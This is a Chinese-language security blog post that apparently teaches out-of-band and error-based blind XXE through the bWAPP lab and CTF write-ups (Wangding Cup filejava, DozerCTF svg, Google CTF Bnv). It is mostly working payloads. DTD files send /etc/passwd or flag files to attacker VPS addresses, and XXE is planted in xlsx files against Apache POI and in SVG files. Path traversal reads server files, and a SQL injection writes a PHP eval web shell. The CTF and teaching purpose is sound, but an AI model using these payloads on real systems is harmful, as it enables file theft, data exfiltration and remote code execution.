@@ -1,0 +1,376 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="e1e557f2593a36c984b5b039155f4836">0x00  前言</h1>
+<p>对于传统的XXE来说，攻击者只有在服务器有回显或报错的情况下才能使用XXE漏洞来读取服务器端文件。 例如</p>
+<pre><code>&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;
+&lt;username&gt;&amp;file;&lt;/username&gt;</code></pre>
+<p>如果服务器没有回显，只能通过Blind XXE构造一条外带信道来提取数据，也就是数据外带。</p>
+<h3 data-content="1" id="50d813ff103bdf1a9a080e108ceb5e54">一个实例</h3>
+<p><strong>xml.php</strong></p>
+<pre><code>&lt;?php
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents('php://input');
+$dom = new DOMDocument();
+$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+?&gt;</code></pre>
+<p><strong>test.dtd</strong></p>
+<pre><code>&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"&gt;
+&lt;!ENTITY % int "&lt;!ENTITY % send SYSTEM 'http://ip:2333?p=%file;'&gt;"&gt;</code></pre>
+<p><strong>payload</strong></p>
+<pre><code>&lt;!DOCTYPE convert [
+&lt;!ENTITY % remote SYSTEM "http://ip/test.dtd"&gt;
+%remote;%int;%send;
+]&gt;</code></pre>
+<h5 data-content="1" id="a2dd4a8b809d37ded5a4306663559bd6">调用过程</h5>
+<ol>
+<li>%remote请求远程vps上的test.dtd</li>
+<li>%int调用test.dtd中的%file</li>
+<li>%file获取服务器上的敏感文件，并传入%send</li>
+<li>%send将数据发送到远程vps上</li>
+</ol>
+<p>这样就实现了外带数据的效果，完美解决了XXE无回显的问题</p>
+<h1 data-content="1" id="b9b614cbb3aec09152dc489125756b21">0x01  bWAPP</h1>
+<p>下面用bWAPP靶场来示例一下有回显XXE和无回显的区别</p>
+<h3 data-content="1" id="d459b486f9dedd780c221a47487c37dc">有回显XXE</h3>
+<p>点击Any bugs抓包查看正常请求，可以看到其中的XML文档</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720174845-33d1d668-ca6e-1.png"/></p>
+<h5 data-content="1" id="50c5535ed3462f75616fd76d8a543940">利用http协议</h5>
+<p><strong>payload</strong></p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+
+&lt;!DOCTYPE test[
+
+&lt;!ENTITY file SYSTEM "http://192.168.115.142/bWAPP/robots.txt"&gt;
+
+]&gt;
+
+&lt;reset&gt;&lt;login&gt;&amp;file;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720174854-393e8fb0-ca6e-1.png"/></p>
+<h5 data-content="1" id="4deb9f40fc3f2d4ae52a3e92e6f0aaec">利用file协议</h5>
+<p><strong>payload</strong></p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+
+&lt;!DOCTYPE test[
+
+&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;
+
+]&gt;
+
+&lt;reset&gt;&lt;login&gt;&amp;file;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720174901-3d8b178c-ca6e-1.png"/></p>
+<h5 data-content="1" id="63bb60fe34eb329596ffc14b9d337cb3">利用php伪协议</h5>
+<p><strong>payload</strong></p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8" ?&gt;
+
+&lt;!DOCTYPE test[
+
+&lt;!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/bWAPP/xxe-1.php"&gt;
+
+]&gt;
+
+&lt;reset&gt;&lt;login&gt;&amp;file;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720174908-415c908e-ca6e-1.png"/></p>
+<h3 data-content="1" id="1d93b6500c9e6761a0acc983ffc59888">无回显XXE</h3>
+<p>由于bWAPP没有无回显靶场，这里用来测试一下数据外带的思路</p>
+<p>我们先在vps上传一个test.dtd文件，内容如下</p>
+<pre><code>&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"&gt;
+&lt;!ENTITY % int "&lt;!ENTITY % send SYSTEM 'http://116.62.211.134:2333/?p=%file;'&gt;"&gt;</code></pre>
+<p><strong>payload</strong></p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt; 
+
+&lt;!DOCTYPE test [ 
+
+&lt;!ENTITY % remote SYSTEM "http://116.62.211.134/test.dtd"&gt; 
+
+%remote;%int;%send; ]&gt;
+
+&lt;reset&gt;&lt;login&gt;bee&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</code></pre>
+<h1 data-content="1" id="7c6031c47e5775b4a8f4edeacff15122">0x02  网鼎杯2020 filejava</h1>
+<h3 data-content="1" id="87367a96fdb9a6852f744ba1d0e7f5aa">CVE-2014-3529</h3>
+<p>Apache POI 3.10-FINAL及以前版本被发现允许远程攻击者通过注入XML外部实体访问外部实体资源或者读取任意文件。</p>
+<h5 data-content="1" id="7249c393e33e925f9aba9b5d9aed867d">影响范围</h5>
+<p>poi-ooxml-3.10-FINAL.jar及以下版本</p>
+<h5 data-content="1" id="f1dc561df9140e778a44e4147f0f46d7">利用文件</h5>
+<p>[Content-Types].xml</p>
+<h5 data-content="1" id="8290209835224da121eaa92b8f33e2aa">漏洞利用</h5>
+<ol>
+<li>新建test.xlsx文件，修改后缀名为.zip并解压，得到以下文件</li>
+</ol>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720174916-46acc914-ca6e-1.png"/></p>
+<ol>
+<li>
+<p>修改[Content_Types].xml，在第二行加入以下内容</p>
+<pre><code>&lt;!DOCTYPE convert [ 
+&lt;!ENTITY % remote SYSTEM "http://ip/file.dtd"&gt;
+%remote;%int;%send;
+]&gt;</code></pre>
+</li>
+<li>
+<p>压缩成zip后再修改后缀为.xlsx</p>
+</li>
+<li>
+<p>在vps上新建一个file.dtd文件，内容如下</p>
+<pre><code>&lt;!ENTITY % file SYSTEM "file:///flag"&gt;
+&lt;!ENTITY % int "&lt;!ENTITY % send SYSTEM 'http://ip:2333?p=%file;'&gt;"&gt;</code></pre>
+</li>
+<li>
+<p>vps开启监听，上传xlsx文件后外带出数据</p>
+</li>
+</ol>
+<h3 data-content="1" id="3f7021588a1eaad2a1fc5aa31e6630ac">解题</h3>
+<h5 data-content="1" id="0811b6c46f89f419a3001692bd6c4456">任意文件下载</h5>
+<p>上传一个文件后可以点击下载</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720174926-4cab683e-ca6e-1.png"/></p>
+<p>修改filename为<code>../</code>后得到一个Java的报错信息</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720174932-50424f8a-ca6e-1.png"/></p>
+<p>这里用目录穿越读取WEB-INF下的web.xml文件</p>
+<pre><code>DownloadServlet?filename=../../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720174943-566c6544-ca6e-1.png"/></p>
+<p>可以看到有UploadServlet、DownloadServlet、ListFileServlet三个class文件</p>
+<pre><code>DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class</code></pre>
+<pre><code>DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/UploadServlet.class</code></pre>
+<pre><code>DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/ListFileServlet.class</code></pre>
+<h5 data-content="1" id="59492ed5402e91c78463f2519a2f7878">Blind XXE</h5>
+<p>依次下载下来后用jd-gui反编译成Java源代码，关键代码在UploadServlet.class第63行起</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720174948-5976fe84-ca6e-1.png"/></p>
+<p>如果是以<code>excel-</code>开头的xlsx文件，就会调用WorkbookFactory.create去处理文件，从而触发XXE</p>
+<p>vps上传一个dtd文件，内容如下</p>
+<pre><code>&lt;!ENTITY % file SYSTEM "file:///flag"&gt;
+&lt;!ENTITY % int "&lt;!ENTITY % send SYSTEM 'http://174.2.73.65:2333?p=%file;'&gt;"&gt;</code></pre>
+<p>将excel解压后，修改[Content-Types].xml，在第二行后加入以下内容</p>
+<pre><code>&lt;!DOCTYPE convert [ 
+&lt;!ENTITY % remote SYSTEM "http://174.2.73.65/xxe.dtd"&gt;
+%remote;%int;%send;
+]&gt;</code></pre>
+<p>vps上开启监听</p>
+<pre><code>nc -lvvp 2333</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720174955-5daf15b8-ca6e-1.png"/></p>
+<h1 data-content="1" id="f686dcd7e8c5a6bbeabc998b60252c96">0x03  DozerCTF2020  svgggggg！</h1>
+<h3 data-content="1" id="d189520f164c87fc4793e1afab9d8d6f">svg简介</h3>
+<p>SVG是一种<a href="https://baike.baidu.com/item/%E5%9B%BE%E5%83%8F%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/10728158" target="_blank">图像文件格式</a>，它的英文全称为Scalable Vector Graphics，意思为可缩放的矢量图形。它是基于XML（Extensible Markup Language），由World Wide Web Consortium（W3C）联盟进行开发的。</p>
+<p>SVG是一种用XML定义的语言，使用 XML 格式定义图形。SVG 文件是纯粹的 XML。</p>
+<h3 data-content="1" id="1951aed1f91e6fa12b9da18570d5b441">svg xxe</h3>
+<p>既然svg也是xml格式，自然可以用来xxe，下面给出有回显和盲打的payload</p>
+<h5 data-content="1" id="e8f0866c8746398c38736fe60a85d5e7">有回显</h5>
+<p><strong>xxe.svg</strong></p>
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE note [
+&lt;!ENTITY file SYSTEM "file:///etc/passwd" &gt;
+]&gt;
+&lt;svg height="100" width="1000"&gt;
+  &lt;text x="10" y="20"&gt;&amp;file;&lt;/text&gt;
+&lt;/svg&gt;</code></pre>
+<h5 data-content="1" id="e51adfa793854335121933770aed912d">无回显</h5>
+<p><strong>xxe.dtd</strong></p>
+<pre><code>&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd" &gt;
+&lt;!ENTITY % send "&lt;!ENTITY res SYSTEM 'http://116.62.211.134:8088/?a=%file;'&gt;"&gt;</code></pre>
+<p><strong>xxe.svg</strong></p>
+<pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+ &lt;!DOCTYPE foo [  
+   &lt;!ELEMENT svg ANY &gt;
+   &lt;!ENTITY % remote SYSTEM "http://116.62.211.134/xxe.xml" &gt;
+%remote;%send;
+   ]&gt;&lt;svg height="100" width="1000"&gt;&amp;res;&lt;/svg&gt;</code></pre>
+<h3 data-content="1" id="fc8c57ab8016b5d726ce3810ff0e0e56">解题</h3>
+<p>这道题应该是加了白，如果请求的文件不是svg的话会返回Unauthorized type!</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720175010-666e6ed8-ca6e-1.png"/></p>
+<p>传入一个svg会成功加载</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720175015-699838a0-ca6e-1.png"/></p>
+<h5 data-content="1" id="86a56e53ce9ed9e242aee97c27b817cc">payload</h5>
+<pre><code>xxe.svg
+&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+ &lt;!DOCTYPE foo [  
+   &lt;!ELEMENT svg ANY &gt;
+   &lt;!ENTITY % remote SYSTEM "http://yourip/xxe.dtd" &gt;
+%remote;%data;
+   ]&gt;
+   &lt;svg height="100" width="1000"&gt;
+   &amp;res;
+   &lt;/svg&gt;
+
+xxe.dtd
+&lt;!ENTITY % show SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd" &gt;
+&lt;!ENTITY % data "&lt;!ENTITY res SYSTEM 'http://yourip:your port/?%show;'&gt;"&gt;</code></pre>
+<h5 data-content="1" id="a2f089c030615d167a7f84502067a379">history</h5>
+<p>根据比赛时候的hint读取一下history</p>
+<pre><code>/home/r1ck/.bash_history</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720175023-6e7bf26c-ca6e-1.png"/></p>
+<pre><code>cd /app
+php -S 0.0.0.0:8080</code></pre>
+<p>得知在app目录下另起了一个web服务，开在8080端口</p>
+<p>读取一下/app/index.php的源码</p>
+<pre><code>&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset="UTF-8"&gt;
+&lt;title&gt;index&lt;/title&gt;
+&lt;/head&gt;
+Hi!
+You Find Me .
+Flag is nearby.
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;?php 
+
+$conn=mysql_connect('127.0.0.1','root','');
+mysql_select_db('security');
+
+if ($_GET['id']){
+    $id = $_GET['id'];
+}
+else 
+    $id = 1;
+$sql = "select * from user where id='$id'";
+$result = mysql_query($sql,$conn);
+$arr = mysql_fetch_assoc($result);
+print_r($arr);
+
+?&gt;</code></pre>
+<h5 data-content="1" id="b77ea91d4dc2e024b60d61361ddc411b">sql注入写shell</h5>
+<p><strong>payload</strong></p>
+<pre><code>1' union select 1,'&lt;?php var_dump(12);eval($_REQUEST[a]);?&gt;',3 into outfile '/app/shell.php</code></pre>
+<p>写shell进去，读取H3re_1s_y0ur_f14g.php文件拿到flag</p>
+<h1 data-content="1" id="a98099575ac3db82a05fb74d5996ae3e">0x04  GoogleCTF2019 Bnv</h1>
+<p>以上都是引入外部服务器的OOB XXE，虽然好用，但是有一个软肋。当服务器配置好防火墙，禁止服务器请求外网dtd文件的话，就无法接受到数据了。</p>
+<p>这时候就可以考虑利用本地dtd来进行XXE</p>
+<h3 data-content="1" id="570ff1eaa904065cab60f56d6f6b4d8d">本地DTD文件</h3>
+<h5 data-content="1" id="119f0bceef705a9b2b64d59feb369361">Linux</h5>
+<pre><code>&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;
+&lt;!ENTITY % ISOamsa 'Your DTD code'&gt;
+%local_dtd;</code></pre>
+<h5 data-content="1" id="0c75651803c3ebfdb1ff19399e9accf8">Windows</h5>
+<pre><code>&lt;!ENTITY % local_dtd SYSTEM "file:///C:Windows/System32/wbem/xml/cim20.dtd"&gt;
+&lt;!ENTITY % SuperClass '&gt;Your DTD code&lt;!ENTITY test "test"'&gt;
+%local_dtd;</code></pre>
+<h3 data-content="1" id="8bd9c87c2d66f9c46c628b0b0f481f71">基于报错的Blind XXE</h3>
+<p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。</p>
+<h5 data-content="1" id="7b529021aa9ed4028f3dc6737577b981">引入服务器文件</h5>
+<p><strong>test.dtd</strong></p>
+<pre><code>&lt;!ENTITY % start "&lt;!ENTITY % error SYSTEM 'file:///fakefile/%file;'&gt;"&gt;
+%start;</code></pre>
+<p><strong>payload</strong></p>
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+
+&lt;!DOCTYPE message [
+
+    &lt;!ENTITY % remote SYSTEM "https://www.0xdawn.cn/test.dtd"&gt;
+
+    &lt;!ENTITY % file SYSTEM "file:///flag"&gt;
+
+    %remote;
+
+    %error;
+
+]&gt;
+
+&lt;message&gt;0xdawn&lt;/message&gt;</code></pre>
+<h5 data-content="1" id="039ee0673a77c342d66714b64d92d618">引入本地文件</h5>
+<p><strong>payload</strong></p>
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+
+&lt;!DOCTYPE message [
+
+    &lt;!ENTITY % local_dtd SYSTEM "/usr/share/yelp/dtd/docbookx.dtd"&gt;
+
+    &lt;!ENTITY % file SYSTEM "file:///flag"&gt;
+
+    &lt;!ENTITY % ISOamso '
+
+        &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file://fakefile/?%file;'&gt;"&gt;
+
+        %eval;
+
+        %send;
+
+    '&gt; 
+
+    %local_dtd;
+
+]&gt;
+
+&lt;message&gt;0xdawn&lt;/message&gt;</code></pre>
+<h5 data-content="1" id="344c7dd7b36a9033d42ea59f7f1c9161">嵌套参数实体</h5>
+<p><strong>payload</strong></p>
+<pre><code>&lt;?xml version="1.0"?&gt;
+
+&lt;!DOCTYPE message [
+
+    &lt;!ELEMENT message (#PCDATA)&gt;
+
+    &lt;!ENTITY % para1 SYSTEM "file:///flag"&gt;
+
+    &lt;!ENTITY % para '
+
+        &lt;!ENTITY % para2 "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///%para1;'&gt;"&gt;
+
+        %para2;
+
+    '&gt;
+
+    %para;
+
+]&gt;
+
+&lt;message&gt;0xdawn&lt;/message</code></pre>
+<p>但是对于三层嵌套参数实体构造的payload有些XML解析器是无法检测出来的</p>
+<h3 data-content="1" id="1dfa580c43a21cc5c044ef228ca3f9c5">解题</h3>
+<h5 data-content="1" id="61aca335fe0cf4ac743b47ea0e1a3ffe">测试过程</h5>
+<p>当我们把Content-type修改为application/xml后，得知缺少xml格式</p>
+<pre><code>Start tag expected, '&lt;' not found, line 1, column 1</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720175042-79f13562-ca6e-1.png"/></p>
+<p>当我们把json格式数据转化为xml格式时，提示缺少dtd文件</p>
+<pre><code>Validation failed: no DTD found !, line 2, column 9</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720175048-7d01c708-ca6e-1.png"/></p>
+<p>我们来添加一个简单的实体引用看看会发生什么</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720175053-806ef5be-ca6e-1.png"/></p>
+<pre><code>No declaration for element message, line 5, column 20</code></pre>
+<p>没有元素消息的声明，显然解析器需要在DTD中声明已定义的元素，我们给出定义</p>
+<p>最终得到了正确的响应，响应格式也从json变为了xml解析器</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720175058-83783630-ca6e-1.png"/></p>
+<p>让我们来试一下加载本地文件</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720175107-885c7f4e-ca6e-1.png"/></p>
+<pre><code>internal error: xmlParseInternalSubset: error detected in Markup declaration
+, line 1, column 1</code></pre>
+<p>得到了一个标记错误，这意味着文件已经成功加载，但因为不符合xml格式，所以中断了</p>
+<h5 data-content="1" id="a2dde7c3b27c1fe300871d2321c0e034">报错流程</h5>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720175112-8bbb6402-ca6e-1.png"/></p>
+<ol>
+<li>xml解析器读取所需文件的内容</li>
+<li>读取另一个文件，确保第二个假文件名中带有所需文件内容</li>
+<li>返回一个错误，因为没有这个文件名</li>
+<li>在错误信息中得到我们想读取的文件的内容</li>
+</ol>
+<h5 data-content="1" id="a86b0039a8507b7d765d3466b415e9b4">payload</h5>
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8" ?&gt;
+
+&lt;!DOCTYPE message[
+
+    &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;
+
+    &lt;!ENTITY % ISOamso '
+
+&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///fakefile/%file;'&gt;"&gt;
+
+%eval;
+
+%error;
+
+'&gt;
+
+%local_dtd;
+
+]&gt;
+
+&lt;message&gt;&amp;id;&lt;/message&gt;</code></pre>
+<p>成功在报错中取回文件内容</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200720175120-9096953c-ca6e-1.png"/></p>
+<h1 data-content="1" id="1f5475ef7dcc4e82d83d8b9390f7aa89">0x05  Reference</h1>
+<p><a href="https://xz.aliyun.com/t/7272" target="_blank">一篇文章读懂Java代码审计之XXE</a></p>
+<p><a href="https://www.gem-love.com/websecurity/2322.html" target="_blank">网鼎杯青龙组Web部分wp</a></p>
+<p><a href="Blind XXE详解与Google CTF一道题分析https://www.freebuf.com/vuls/207639.html" target="_blank">Blind XXE详解与Google CTF一道题分析</a></p>
+</div>
+</div>
